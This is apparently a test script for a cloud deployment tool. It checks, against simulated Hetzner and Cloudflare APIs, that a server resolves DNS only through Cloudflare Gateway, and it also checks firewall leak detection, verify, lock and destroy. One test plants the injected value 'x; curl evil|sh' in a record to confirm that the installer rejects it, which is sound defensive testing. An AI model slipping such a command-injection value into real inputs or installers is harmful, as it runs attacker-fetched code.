"""Gateway DNS for a 24/7 server (cloud.py --gateway-dns) against simulated Hetzner and Cloudflare: no network.

Covers the options, the plan, a quick-tunnel deployment that resolves only through its own Gateway location (the
resolver configuration in the installer, the outbound firewall rules, the installer this checkout rebuilds), lock
keeping the outbound rules, verify with its firewall and Gateway checks in a clean case, with a DNS leak in the
firewall, a Gateway policy that rewrites answers and a late audit entry, destroy, and a tampered record.
"""
import argparse
import asyncio
import copy
import json
import sys
import tempfile
import time
import uuid
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tools"))

from check_cloud_wizard import (ACCOUNT, CF_TOKEN, HZ_TOKEN, OTHER, Host, Response, World, quick_args,
                                quiet)
from tgwitness import anchoring, cloud
from tgwitness.evidence import export_file
from tgwitness.providers import base, hetzner
from tgwitness.security import Vault
from tgwitness.store import Store
from tgwitness.verify import outside_lines, verify_bundle

LOCATION, SUBDOMAIN = "4739d127f17f4e4c90d22502fc0043b6", "y7wmnyuf4l"
LOG_TOKEN = "r" * 40


class GatewayWorld(World):
    """World plus Cloudflare Gateway, its analytics and audit log, and the Hetzner reads verify makes."""

    def __init__(self, location_limit=False):
        super().__init__()
        self.gateway_ready, self.locations, self.rules, self.log_all = False, {}, [], True
        self.location_limit = location_limit
        self.audit, self.queries = [], []

    def request(self, method, url, timeout=None, json=None, params=None, headers=None, data=None):
        if url == cloud.CLOUDFLARE_API + "/graphql":
            with self.guard:
                self.calls.append((method, url, params))
                assert (headers or {}).get("Authorization") == "Bearer " + CF_TOKEN
                wanted = json["variables"]
                assert wanted["account"] == ACCOUNT and wanted["location"] == str(uuid.UUID(LOCATION)), wanted
                assert wanted["source"] == self.ipv4, "only this server's queries"
                since, until = (base.parse_time(wanted[k]).timestamp() for k in ("since", "until"))
                assert until - since <= 3 * 3600, "Cloudflare refuses a range wider than 3 hours"
                rows = [{"dimensions": q} for q in self.queries
                        if since <= base.parse_time(q["datetime"]).timestamp() < until]
                return Response(200, {"data": {"viewer": {"accounts": [{"cf1GatewayDnsRawGroups": rows}]}},
                                      "errors": None})
        if url == cloud.CLOUDFLARE_API + "/accounts/" + ACCOUNT + "/gateway/locations" and method == "POST" \
                and self.location_limit:
            with self.guard:
                self.calls.append((method, url, params))
            return Response(401, {"success": False, "result": None, "errors": [
                {"code": 1002, "message": "This account does not have access to this feature."}]})
        if url == cloud.CLOUDFLARE_API + "/accounts/" + ACCOUNT + "/gateway" and method == "GET" and not self.gateway_ready:
            with self.guard:
                self.calls.append((method, url, params))
            return Response(400, {"success": False, "result": None, "errors": [
                {"code": 1001, "message": "Account ID is invalid or has not been initialized."}]})
        return super().request(method, url, timeout, json, params, headers, data)

    def cloudflare(self, method, path, body, params):
        gateway = "/accounts/" + ACCOUNT + "/gateway"
        if path.startswith("/accounts/" + OTHER + "/gateway"):
            return 403, None
        if path == gateway and method == "GET":
            return (200, {"id": ACCOUNT}) if self.gateway_ready else (400, None)
        if path == gateway and method == "POST":
            self.gateway_ready = True
            self.audit.append(self.entry("gateway_create", "gateway.account"))
            return 200, {"id": ACCOUNT, "provider_name": "Cloudflare"}
        if path == gateway + "/locations" and method == "POST" and self.location_limit:
            return 401, None
        if path == gateway + "/locations" and method == "POST":
            assert self.gateway_ready and body["endpoints"]["dot"]["enabled"] and not body["endpoints"]["ipv4"]["enabled"]
            self.locations[LOCATION] = {"id": LOCATION, "name": body["name"], "doh_subdomain": SUBDOMAIN,
                                        "endpoints": body["endpoints"]}
            self.audit.append(self.entry("gateway_create", "gateway.location", LOCATION))
            return 200, self.locations[LOCATION]
        if path == gateway + "/locations" and method == "GET":
            return 200, list(self.locations.values())
        if path == gateway + "/locations/" + LOCATION and method == "GET":
            return (200, self.locations[LOCATION]) if LOCATION in self.locations else (404, None)
        if path == gateway + "/locations/" + LOCATION and method == "DELETE":
            self.locations.pop(LOCATION, None)
            return 200, {"id": LOCATION}
        if path == gateway + "/logging":
            return 200, {"settings_by_rule_type": {"dns": {"log_all": self.log_all}}, "redact_pii": False}
        if path == gateway + "/rules":
            return 200, self.rules
        if path == "/accounts/" + ACCOUNT + "/audit_logs":
            return 200, self.audit
        return super().cloudflare(method, path, body, params)

    def entry(self, action, kind, resource_id=None, when="2026-11-01T10:00:00Z"):
        return {"when": when, "action": {"type": action}, "actor": {"email": "owner@example.org"},
                "resource": {"type": kind, "id": resource_id}}

    def hetzner(self, method, path, body, params):
        page = {"meta": {"pagination": {"next_page": None}}}
        parts = path.strip("/").split("/")
        if parts[0] == "firewalls" and len(parts) == 2 and method == "GET":
            return Response(200, {"firewall": self.firewalls[int(parts[1])]})
        if parts[0] == "firewalls" and parts[2:] == ["actions", "set_rules"]:
            self.firewalls[int(parts[1])]["rules"] = body["rules"]
            return Response(201, {"actions": [self.action("set_firewall_rules")]})
        if parts[-1] == "actions" and method == "GET":
            commands = ["create_server", "start_server"] if parts[0] == "servers" else ["set_firewall_rules"]
            return Response(200, {"actions": [self.action(c) for c in commands], **page})
        if parts[0] == "servers" and len(parts) == 2 and method == "GET":
            server = copy.deepcopy(self.servers[int(parts[1])])
            server["public_net"]["firewalls"] = [{"id": f, "status": "applied"} for f in self.firewalls]
            return Response(200, {"server": server})
        return super().hetzner(method, path, body, params)


def recent(minutes):
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - minutes * 60))


def gateway_args(directory, name="dns-1"):
    return argparse.Namespace(**{**vars(quick_args(directory, name)), "cloudflare_account": ACCOUNT,
                                 "gateway_dns": True})


def verify_args(out):
    return argparse.Namespace(record=out / "deployment.json", provider_token_file=None, cloudflare_token_file=None,
                              fingerprint=None, cloud_init=None, source=None, evidence=None, report=None)


def statuses(report):
    return {c["check"]: c["status"] for c in report["checks"]}


def check_rules():
    spec = {"gateway": {"account": ACCOUNT}}
    rules = cloud.outbound_rules(spec)
    assert cloud.dns_leaks(rules) == [] and cloud.outbound_rules({"gateway": None}) == []
    assert cloud.dns_leaks([]) == ["no outbound rules: every destination is reachable, DNS included"]
    leak = rules + [{"protocol": "udp", "port": "53", "destination": ["185.12.64.1/32"]}]
    assert cloud.dns_leaks(leak) == ["udp 53 to 185.12.64.1/32"]
    wide = [{"protocol": "tcp", "port": None, "destination": ["0.0.0.0/0"]}]
    assert cloud.dns_leaks(wide) == ["tcp 53 to 0.0.0.0/0", "tcp 853 to 0.0.0.0/0"]
    near = [{"protocol": "tcp", "port": "853", "destination": ["172.64.36.0/24"]}]
    assert cloud.dns_leaks(near) == ["tcp 853 to 172.64.36.0/24"], "a wider network than Gateway's resolvers leaks"
    assert hetzner.outbound_rule(rules[-1]) == {"direction": "out", "protocol": "icmp", "destination_ips":
                                                ["0.0.0.0/0", "::/0"], "description": "TgWitness: DNS only to Cloudflare Gateway"}
    return "ok  outbound rules: DNS only to Gateway's two resolvers; leaks named, wider networks included"


def check_options(directory):
    spec = cloud.specification(gateway_args(directory), lambda r, ref: ref)
    assert spec["gateway"] == {"account": ACCOUNT, "location_id": None, "doh_subdomain": None}
    assert spec["beacon"] and spec["cloudflare_account"] == ACCOUNT
    for wrong, message in (({"provider": "digitalocean", "server_type": "s-1vcpu-2gb"}, "Hetzner only"),
                           ({"cloudflare_account": None}, "--cloudflare-account"),
                           ({"gateway_dns": False}, "only with --gateway-dns")):
        try:
            cloud.specification(argparse.Namespace(**{**vars(gateway_args(directory)), **wrong}), lambda r, ref: ref)
            raise AssertionError("refused expected: " + message)
        except base.DeployError as exc:
            assert message in str(exc), exc
    shown = cloud.plan(spec)
    assert "Cloudflare Gateway: a DNS location tgwitness-dns-1-" in shown and "outbound rules" in shown
    assert "DNS=172.64.36.1#LOCATION-AFTER-CREATION.cloudflare-gateway.com" in shown
    return "ok  options and plan: Hetzner only, needs the account, combines with a quick tunnel"


def check_deployment(directory):
    world = GatewayWorld()
    host, stages, hz, cf = Host(world, directory), [], hetzner.Hetzner(HZ_TOKEN, session=world), \
        cloud.Cloudflare(CF_TOKEN, world)
    beacon = lambda topic, key=None: cloud.read_beacon(topic, key, world)  # noqa: E731
    record, out = cloud.deploy(gateway_args(directory), hz, cf, host.fetch, resolve=lambda repository, ref: ref,
                               progress=lambda stage, text: stages.append(stage), beacon=beacon)
    assert record["state"] == "running" and stages == ["tunnel", "gateway", "gateway", "server", "running", "waiting"], stages
    assert world.gateway_ready, "an account that never used Gateway gets it switched on"
    assert record["gateway"] == {"account": ACCOUNT, "location_id": LOCATION, "doh_subdomain": SUBDOMAIN}
    data = world.user_data
    assert "DNS=172.64.36.1#y7wmnyuf4l.cloudflare-gateway.com 172.64.36.2#y7wmnyuf4l.cloudflare-gateway.com" in data
    assert "DNSOverTLS=yes" in data and "FallbackDNS=" in data and "systemctl restart systemd-resolved" in data
    assert data.index("systemctl restart systemd-resolved") < data.index("apt-get"), "DNS works before apt runs"
    assert '"gateway": {"account": "' + ACCOUNT in data, "the server's own description names its location"
    published = (out / "cloud-init.redacted.yaml").read_text(encoding="utf-8")
    assert cloud.reference_installer(record, ROOT) == published
    rules = next(iter(world.firewalls.values()))["rules"]
    outbound = [r for r in rules if r["direction"] == "out"]
    assert len(outbound) == 8 and not [r for r in rules if r["direction"] == "in"]
    assert {"direction": "out", "protocol": "tcp", "port": "853", "destination_ips": ["172.64.36.1/32", "172.64.36.2/32"],
            "description": "TgWitness: DNS only to Cloudflare Gateway"} in outbound
    assert record["firewall"]["outbound_rules"] == cloud.outbound_rules(record)

    world.queries = [{"datetime": recent(5), "destination": "drand.cloudflare.com"},
                     {"datetime": recent(6), "destination": "pkg.cloudflare.com"}]
    report = cloud.verify(verify_args(out), hz, cf, host.fetch, beacon)
    found = statuses(report)
    for check in ("dns_firewall", "gateway_location", "gateway_logging", "gateway_rules", "gateway_queries",
                  "gateway_audit"):
        assert found[check] == "pass", (check, found, report["checks"])
    assert report["cloudflare"]["gateway_names_24h"] == ["drand.cloudflare.com", "pkg.cloudflare.com"]
    assert any("Cloudflare Gateway" in t for t in report["establishes"])
    assert any("DNS over HTTPS on port 443" in t for t in report["does_not_establish"])
    text = cloud.render(report)
    assert "Records kept by Cloudflare Gateway" in text and str(uuid.UUID(LOCATION)) in text

    firewall = next(iter(world.firewalls.values()))
    firewall["rules"].append({"direction": "out", "protocol": "udp", "port": "53", "destination_ips": ["0.0.0.0/0"]})
    world.rules = [{"name": "steer", "action": "override", "enabled": True, "filters": ["dns"],
                    "traffic": 'any(dns.domains[*] == "api.telegram.org")'}]
    later = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(base.parse_time(record["created_at"]).timestamp() + 7200))
    world.audit.append(world.entry("gateway_update", "gateway.rule", "r1", when=later))
    world.log_all, world.queries = False, []
    report = cloud.verify(verify_args(out), hz, cf, host.fetch, beacon)
    found = statuses(report)
    assert found["dns_firewall"] == "fail" and found["gateway_rules"] == "review" and found["gateway_audit"] == "review", found
    assert found["gateway_logging"] == "review" and found["gateway_queries"] == "review" and report["result"] == "fail"
    detail = {c["check"]: c["detail"] for c in report["checks"]}
    assert "udp 53 to 0.0.0.0/0" in detail["dns_firewall"] and "steer (override)" in detail["gateway_rules"]
    firewall["rules"].pop()

    locked = argparse.Namespace(record=out / "deployment.json", provider_token_file=None)
    cloud.lock(locked, hz)
    assert firewall["rules"] == outbound, "lock keeps the outbound rules"

    tampered = json.loads((out / "deployment.json").read_text(encoding="utf-8"))
    tampered["gateway"]["doh_subdomain"] = "x; curl evil|sh"
    try:
        cloud.installer_spec(tampered)
        raise AssertionError("a tampered Gateway name must not reach the reference installer")
    except base.DeployError:
        pass

    args = argparse.Namespace(record=out / "deployment.json", confirm="dns-1", provider_token_file=None,
                              cloudflare_token_file=None)
    record, removed = cloud.destroy(args, hz, cf, progress=lambda stage, text: None)
    assert [r["resource"] for r in removed] == ["server", "firewall", "gateway location"], removed
    assert not world.locations and not world.servers
    return ("ok  deployment: DNS over TLS to its own location before apt, outbound rules, rebuilt installer, "
            "verify clean and with a leak, an override policy and a late change, lock, destroy, tampered record")


def check_shared(directory):
    """Without a Zero Trust plan Cloudflare allows one DNS location: the server shares the account's only one."""
    world = GatewayWorld(location_limit=True)
    world.gateway_ready = True
    world.locations[LOCATION] = {"id": LOCATION, "name": "home router", "doh_subdomain": SUBDOMAIN,
                                 "endpoints": {"dot": {"enabled": True}, "doh": {"enabled": True}}}
    host, hz, cf = Host(world, directory), hetzner.Hetzner(HZ_TOKEN, session=world), cloud.Cloudflare(CF_TOKEN, world)
    beacon = lambda topic, key=None: cloud.read_beacon(topic, key, world)  # noqa: E731
    lines = []
    record, out = cloud.deploy(gateway_args(directory, "dns-2"), hz, cf, host.fetch,
                               resolve=lambda repository, ref: ref, progress=lambda stage, text: lines.append(text),
                               beacon=beacon)
    assert record["gateway_shared"] is True and record["gateway"]["location_id"] == LOCATION
    assert any("shared; this server's queries are told apart by its address" in line for line in lines), lines
    assert cloud.reference_installer(record, ROOT) == (out / "cloud-init.redacted.yaml").read_text(encoding="utf-8")
    world.queries = [{"datetime": recent(5), "destination": "ntfy.sh"}]
    report = cloud.verify(verify_args(out), hz, cf, host.fetch, beacon)
    found, detail = statuses(report), {c["check"]: c["detail"] for c in report["checks"]}
    assert found["gateway_location"] == "pass" and "shared" in detail["gateway_location"]
    assert found["gateway_queries"] == "pass" and "from " + world.ipv4 in detail["gateway_queries"]
    args = argparse.Namespace(record=out / "deployment.json", confirm="dns-2", provider_token_file=None,
                              cloudflare_token_file=None)
    record, removed = cloud.destroy(args, hz, cf, progress=lambda stage, text: None)
    assert [r["resource"] for r in removed] == ["server", "firewall"] and LOCATION in world.locations
    world.locations["0" * 32] = {"id": "0" * 32, "name": "office", "doh_subdomain": "officeabc", "endpoints": {}}
    try:
        cloud.deploy(gateway_args(directory, "dns-3"), hz, cf, host.fetch, resolve=lambda repository, ref: ref,
                     progress=lambda stage, text: None, beacon=beacon)
        raise AssertionError("two locations and no room for a third: the operator must choose")
    except base.DeployError as exc:
        assert "--gateway-location" in str(exc) and "office" in str(exc)
    return ("ok  shared location: the only one is used when Cloudflare refuses another, queries told apart by "
            "the server's address, destroy leaves it; with several the operator chooses")


def fake_log(rows, seen):
    """Cloudflare's analytics API for anchoring.request: the rows inside each window asked, oldest first."""
    async def request(method, url, network, headers=None, body=b"", **options):
        assert method == "POST" and url == anchoring.GATEWAY_GRAPHQL and headers["Authorization"] == "Bearer " + LOG_TOKEN
        asked = json.loads(body)["variables"]
        seen.append(asked)
        since, until = (base.parse_time(asked[k]).timestamp() for k in ("since", "until"))
        assert until - since <= 3 * 3600 and asked["location"] == str(uuid.UUID(LOCATION))
        found = [r for r in rows if since < base.parse_time(r["datetime"]).timestamp() <= until
                 and (asked.get("source") in (None, r["source"]))]
        found = sorted(found, key=lambda r: r["datetime"])[:anchoring.GATEWAY_LIMIT]  # orderBy: datetime_ASC
        dims = [{k: v for k, v in r.items() if k != "source"} for r in found]
        answer = {"data": {"viewer": {"accounts": [{"cf1GatewayDnsRawGroups": [{"dimensions": d} for d in dims]}]}}}
        return 200, {}, json.dumps(answer).encode()
    return request


def row(minutes, name, source="2.31.117.207", seconds=0):
    return {"datetime": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - minutes * 60 + seconds)),
            "destination": name, "queryType": "1", "rcode": "0",
            "resolverDecision": "allowedOnNoPolicyMatch", "coloName": "FRA", "source": source}


def check_journal_copy(directory):
    directory.mkdir(parents=True)
    vault, store = Vault(directory), Store(directory)
    store.bind(vault)
    store.append("process.started", {"version": "check"})
    config = {"account": ACCOUNT, "location_id": LOCATION, "address": "2.31.117.207", "token": LOG_TOKEN}
    rows = [row(600, "github.com"), row(300, "pypi.org"), row(200, "home.example", source="198.51.100.9"),
            row(30, "ntfy.sh")] + [row(90, "burst" + str(i) + ".example", seconds=i // 3) for i in range(1005)]
    seen, saved = [], anchoring.request
    anchoring.request = fake_log(rows, seen)
    try:
        first = asyncio.run(anchoring.record_gateway(store, None, config))
        assert first["count"] == 1008 and len(seen) >= 8, (first, len(seen))  # 24 hours in 3-hour windows
        again = asyncio.run(anchoring.record_gateway(store, None, config))
        assert again.get("skipped"), "nothing new within a minute"
        payloads = [json.loads(r[0]) for r in store.db.execute(
            "SELECT payload FROM events WHERE kind='cloudflare.gateway_dns' ORDER BY seq")]
        names = [q[1] for p in payloads for q in p["queries"]]
        assert "home.example" not in names and "ntfy.sh" in names and len(set(names)) == len(names)
        assert all("token" not in json.dumps(p) and p["address"] == "2.31.117.207" for p in payloads)
        assert all(a["from"] == b["until"] for b, a in zip(payloads, payloads[1:])), "windows follow each other"
        archive = export_file(store, vault, "zip")
        outside = verify_bundle(archive)["outside"]
        gateway = outside["gateway"]
        assert gateway["queries"] == 1008 and gateway["gaps_total"] == 0 and gateway["addresses"] == ["2.31.117.207"]
        lines = outside_lines(outside)
        assert any("Cloudflare Gateway DNS log copied in" in line and "1008 quer(ies)" in line for line in lines), lines
        moved = {**config, "location_id": "0" * 32}
        seen.clear()
        try:
            asyncio.run(anchoring.record_gateway(store, None, moved))
        except AssertionError:
            pass  # another location starts from Cloudflare's retention again, not from the old cursor
        assert seen and base.parse_time(seen[0]["since"]).timestamp() < time.time() - 23 * 3600
    finally:
        anchoring.request = saved
    flood = [row(20, "flood" + str(i) + ".example", seconds=0) for i in range(1003)]
    anchoring.request = fake_log(flood, [])
    store.set_setting("evidence_gateway_cursor", None)
    try:
        asyncio.run(anchoring.record_gateway(store, None, config))
    finally:
        anchoring.request = saved
    outside = verify_bundle(export_file(store, vault, "zip"))["outside"]
    assert outside["gateway"]["truncated_windows"] == 1, outside["gateway"]
    assert any("more queries in one second than one page" in line for line in outside_lines(outside))
    forged = json.loads(json.dumps(payloads[0]))
    forged["count"] += 1
    store.append("cloudflare.gateway_dns", forged)
    try:
        verify_bundle(export_file(store, vault, "zip"))
        raise AssertionError("a record whose count does not match its queries must fail")
    except ValueError as exc:
        assert "malformed" in str(exc)
    store.db.close()
    return ("ok  journal copy: 24 hours in 3-hour windows, a full page read whole, only this address, no token in "
            "the journal, windows without gaps, verify.py summary, a new location restarts, a forged count fails")


def check_panel_api(directory):
    from check_browser import RunningApp
    import requests
    import tgwitness.app as panel
    calls, saved = [], panel.gateway_rows

    async def accepted(network, config, since, until):
        calls.append(config)
        if config["token"] == "refused-token-" + "x" * 20:
            raise ValueError("Cloudflare: authentication error")
        return []
    panel.gateway_rows = accepted
    try:
        with RunningApp(directory / "api") as server:
            store, vault = server.app.state.store, server.app.state.vault
            session = requests.post(server.url + "/api/access/login", json={"token": vault.token}, timeout=10).json()["session"]
            headers = {"Authorization": "Bearer " + session}
            call = lambda method, body=None: requests.request(method, server.url + "/api/evidence/gateway", json=body,  # noqa: E731
                                                              headers=headers, timeout=10)
            good = {"account": ACCOUNT, "location_id": str(uuid.UUID(LOCATION)), "address": "2.31.117.207",
                    "token": LOG_TOKEN}
            for wrong in ({"token": "cfk_" + "x" * 40}, {"address": "not-an-ip"}, {"location_id": "office"},
                          {"token": ""}, {"token": "refused-token-" + "x" * 20}):
                answer = call("POST", {**good, **wrong})
                assert answer.status_code == 422, (wrong, answer.text)
            assert not vault.read("gateway")
            state = call("POST", good).json()
            assert state["gateway"] == {"account": ACCOUNT, "location_id": LOCATION, "address": "2.31.117.207",
                                        "has_token": True, "suggested": None}
            assert vault.read("gateway")["token"] == LOG_TOKEN and calls[-1]["location_id"] == LOCATION
            kept = call("POST", {**good, "token": "", "address": ""}).json()
            assert kept["gateway"]["has_token"] and vault.read("gateway")["token"] == LOG_TOKEN, "empty token keeps it"
            logged = [json.loads(r[0]) for r in store.db.execute(
                "SELECT payload FROM events WHERE kind='evidence.gateway_set'")]
            assert logged and all(LOG_TOKEN not in json.dumps(p) for p in logged)
            removed = call("DELETE").json()
            assert removed["gateway"]["has_token"] is False and not vault.read("gateway").get("token")
    finally:
        panel.gateway_rows = saved
    return "ok  panel API: invalid values and a refused token save nothing, token kept when left empty, never journalled, removed"


def check_browser(directory, output):
    from check_browser import RunningApp as PanelApp, check_layout, launch_browser, navigate_panel, reload_panel, unlock
    from playwright.sync_api import expect, sync_playwright
    import tgwitness.app as panel

    async def accepted(network, config, since, until):
        return []

    async def untouched(store, network, settings, devices, gateway=None):
        return store.get_setting("evidence_witnesses", None) or {}
    saved_rows, saved_extras = panel.gateway_rows, anchoring.record_extras
    panel.gateway_rows, anchoring.record_extras = accepted, untouched
    world = GatewayWorld()
    host, errors = Host(world, directory / "host"), []
    try:
        with PanelApp(directory / "panel") as server, sync_playwright() as p:
            jobs = server.app.state.cloud_jobs
            jobs.session, jobs.fetch = world, host.fetch
            jobs.beacon = lambda topic, key=None: cloud.read_beacon(topic, key, world)
            browser = launch_browser(p)
            page = browser.new_context(viewport={"width": 1280, "height": 1000}, reduced_motion="reduce").new_page()
            page.on("pageerror", lambda exc: errors.append(str(exc)))
            unlock(page, server)
            navigate_panel(page, "witness")
            page.locator("#extras-open-evidence").click()
            expect(page.locator("#gateway-form")).to_be_hidden()
            page.locator("#evidence-more summary").click()
            page.locator("#evidence-gateway").check()
            expect(page.locator("#gateway-form")).to_be_visible()
            page.locator("#gateway-account").fill(ACCOUNT)
            page.locator("#gateway-location").fill(LOCATION)
            page.locator("#gateway-address").fill("2.31.117.207")
            page.locator("#gateway-token").fill(LOG_TOKEN)
            page.locator("#gateway-form button[type=submit]").click()
            expect(page.locator("#gateway-status")).to_contain_text("Saved")
            expect(page.locator("#gateway-remove")).to_be_visible()
            assert server.app.state.vault.read("gateway")["token"] == LOG_TOKEN
            store = server.app.state.store
            store.set_setting("evidence", {**anchoring.EvidenceMode().model_dump(), "enabled": True, "gateway": True,
                                           "tsa_urls": [], "ots_calendars": []})
            store.set_setting("evidence_witnesses", {"gateway": {"at": recent(1), "ok": True, "count": 36,
                                                                 "until": recent(3), "seq": 9}})
            reload_panel(page)
            expect(page.locator("#view-witness")).to_be_visible()
            navigate_panel(page, "witness")
            page.locator("#extras-open-evidence").click()
            expect(page.locator("#evidence-status")).to_contain_text("Cloudflare Gateway log copied: 36 queries")
            for width in (390, 1440):
                page.set_viewport_size({"width": width, "height": 1000})
                check_layout(page)
            page.set_viewport_size({"width": 1280, "height": 1000})
            page.locator("#gateway-form").screenshot(path=str(output / "gateway-log-form.png"))

            page.locator('[data-extra-close="evidence"]').click()
            page.locator("#extras-open-cloud").click()
            page.locator("#cloud-hetzner-token").fill(HZ_TOKEN)
            page.locator("#cloud-gateway summary").click()
            page.locator("#cloud-gateway-on").check()
            page.locator("#cloud-check").click()
            expect(page.locator("#cloud-setup .form-error")).to_contain_text("Gateway DNS needs a Cloudflare API token")
            page.locator("#cloud-gateway-token").fill(CF_TOKEN)
            page.locator("#cloud-check").click()
            expect(page.locator("#cloud-offer")).to_be_visible()
            page.locator("#cloud-domain").select_option("quick")
            expect(page.locator("#cloud-dns")).to_contain_text("Only through Cloudflare Gateway, account Mine")
            expect(page.locator("#cloud-gateway-field")).to_be_hidden()  # one usable account: nothing to choose
            page.locator("#cloud-offer").screenshot(path=str(output / "wizard-gateway-offer.png"))
            page.locator("#cloud-consent").check()
            page.locator("#cloud-create").click()
            expect(page.locator("#cloud-job-title")).to_have_text("The server is ready", timeout=30000)
            assert LOCATION in world.locations and "tgwitness-gateway.conf" in world.user_data
            name = world.servers[world.server_id]["name"]
            page.locator("#cloud-servers").evaluate("details => details.open = true")
            row_box = page.locator(".cloud-server", has_text=name)
            expect(row_box).to_contain_text("DNS only through Cloudflare Gateway")
            page.once("dialog", lambda dialog: dialog.accept(name))
            row_box.get_by_role("button", name="Delete the server").click()
            expect(page.locator("#cloud-job-title")).to_have_text("The server is deleted", timeout=30000)
            assert not world.locations and not world.servers
            browser.close()
    finally:
        panel.gateway_rows, anchoring.record_extras = saved_rows, saved_extras
    assert not errors, errors
    return "ok  browser: Gateway log form saves and shows the copy; wizard asks for the token, offers Gateway DNS, deploys and deletes it"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--no-browser", action="store_true", help="Skip the panel flows in a browser")
    args = parser.parse_args()
    quiet()
    print(check_rules())
    with tempfile.TemporaryDirectory() as tmp:
        print(check_options(Path(tmp)))
        print(check_deployment(Path(tmp)))
        print(check_shared(Path(tmp)))
        print(check_journal_copy(Path(tmp) / "journal"))
        print(check_panel_api(Path(tmp)))
        if not args.no_browser:
            output = ROOT / "test-results" / "gateway-dns"
            output.mkdir(parents=True, exist_ok=True)
            print(check_browser(Path(tmp), output))
    print("gateway DNS checks passed")


if __name__ == "__main__":
    main()
